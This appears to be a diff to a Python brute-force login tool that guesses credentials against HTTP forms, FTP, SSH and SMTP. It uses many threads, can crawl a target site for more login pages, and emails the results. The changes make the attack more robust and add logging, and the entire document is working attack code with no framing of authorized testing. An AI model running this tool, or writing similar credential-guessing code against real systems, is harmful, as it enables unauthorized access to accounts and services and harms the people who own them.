@@ -11,6 +11,7 @@ import queue
 class BruteForceAttacker:
     def __init__(self, protocol, target_url, usernames, passwords, log_callback,
                  username_only=False, crawl_all=False, threads=10, smtp_config=None):
+
         self.protocol = protocol.lower()
         self.target_url = target_url
         self.usernames = usernames
@@ -37,13 +38,16 @@ class BruteForceAttacker:
 
         # Crawl for HTTP
         if self.protocol == "http" and self.crawl_all:
-            crawler = Crawler(self.target_url)
-            pages = crawler.start()
-            if pages:
-                self.log(f"[+] Found {len(pages)} pages to attack.")
-                targets = pages
-            else:
-                self.log("[!] No crawl results, attacking base URL only.")
+            try:
+                crawler = Crawler(self.target_url)
+                pages = crawler.start()
+                if pages:
+                    self.log(f"[+] Found {len(pages)} pages to attack.")
+                    targets = pages
+                else:
+                    self.log("[!] No crawl results, attacking base URL only.")
+            except Exception as e:
+                self.log(f"[!] Crawler error: {e}. Attacking base URL only.")
 
         # Prepare task queue
         for target in targets:
@@ -51,14 +55,17 @@ class BruteForceAttacker:
                 for password in self.passwords:
                     self.task_queue.put((target, username, password))
 
+        total_tasks = self.task_queue.qsize()
+        self.log(f"[+] Loaded {total_tasks} credential combinations into task queue.")
+
         # Start threads
         threads = []
         for _ in range(self.threads_limit):
-            t = threading.Thread(target=self.worker)
+            t = threading.Thread(target=self.worker, daemon=True)
             t.start()
             threads.append(t)
 
-        # Wait for queue
+        # Wait for threads to finish
         for t in threads:
             t.join()
 
@@ -71,10 +78,19 @@ class BruteForceAttacker:
             total_attempts=total_attempts
         )
 
+        if report_paths:
+            self.log("[+] Reports generated successfully.")
+        else:
+            self.log("[!] No successful credentials. Report will only contain summary.")
+
         # Send via email if enabled
         if self.smtp_config and report_paths:
             from report_generator import send_email_report
-            send_email_report(report_paths, self.smtp_config, self.log)
+            try:
+                send_email_report(report_paths, self.smtp_config, self.log)
+                self.log("[+] Report emailed successfully.")
+            except Exception as e:
+                self.log(f"[!] Failed to send email report: {e}")
 
     def worker(self):
         while not self.task_queue.empty():
@@ -83,30 +99,35 @@ class BruteForceAttacker:
             except queue.Empty:
                 break
 
-            if self.protocol == "http":
-                self.http_try(target, username, password)
-            elif self.protocol == "ftp":
-                self.ftp_try(username, password)
-            elif self.protocol == "ssh":
-                self.ssh_try(username, password)
-            elif self.protocol == "smtp":
-                self.smtp_try(username, password)
-            else:
-                self.log(f"[!] Unsupported protocol {self.protocol}")
-
-            self.task_queue.task_done()
+            try:
+                if self.protocol == "http":
+                    self.http_try(target, username, password)
+                elif self.protocol == "ftp":
+                    self.ftp_try(username, password)
+                elif self.protocol == "ssh":
+                    self.ssh_try(username, password)
+                elif self.protocol == "smtp":
+                    self.smtp_try(username, password)
+                else:
+                    self.log(f"[!] Unsupported protocol {self.protocol}")
+            finally:
+                self.task_queue.task_done()
 
     # -------- Protocol Try Methods --------
     def http_try(self, url, username, password):
         try:
             self.log(f"[*] Trying HTTP {username}:{password}")
-            r = requests.post(url, data={"username": username, "password": password}, timeout=5)
+            r = requests.post(
+                url,
+                data={"username": username, "password": password},
+                timeout=5
+            )
             if r.status_code == 200 and "invalid" not in r.text.lower():
                 self.record_success(username, password)
             else:
                 self.log(f"[-] Failed: {username}:{password}")
         except Exception as e:
-            self.log(f"[!] HTTP Error: {e}")
+            self.log(f"[!] HTTP Error for {username}:{password} → {str(e)[:80]}")
 
     def ftp_try(self, username, password):
         try:
@@ -115,8 +136,8 @@ class BruteForceAttacker:
             ftp.login(user=username, passwd=password)
             self.record_success(username, password)
             ftp.quit()
-        except:
-            self.log(f"[-] Failed: {username}:{password}")
+        except Exception as e:
+            self.log(f"[-] FTP failed {username}:{password} → {str(e)[:80]}")
 
     def ssh_try(self, username, password):
         try:
@@ -126,8 +147,8 @@ class BruteForceAttacker:
             ssh.connect(self.target_url, username=username, password=password, timeout=5)
             self.record_success(username, password)
             ssh.close()
-        except:
-            self.log(f"[-] Failed: {username}:{password}")
+        except Exception as e:
+            self.log(f"[-] SSH failed {username}:{password} → {str(e)[:80]}")
 
     def smtp_try(self, username, password):
         try:
@@ -137,14 +158,14 @@ class BruteForceAttacker:
             server.login(username, password)
             self.record_success(username, password)
             server.quit()
-        except:
-            self.log(f"[-] Failed: {username}:{password}")
+        except Exception as e:
+            self.log(f"[-] SMTP failed {username}:{password} → {str(e)[:80]}")
 
     # -------- Success Logging --------
     def record_success(self, username, password):
         if self.username_only:
             self.log(f"[+] Valid username found: {username}")
         else:
-            self.log(f"[+] Success! Keyword match: {username}:{password}")
+            self.log(f"[+] SUCCESS: {username}:{password}")
         with self.lock:
             self.found_credentials.append((username, password))
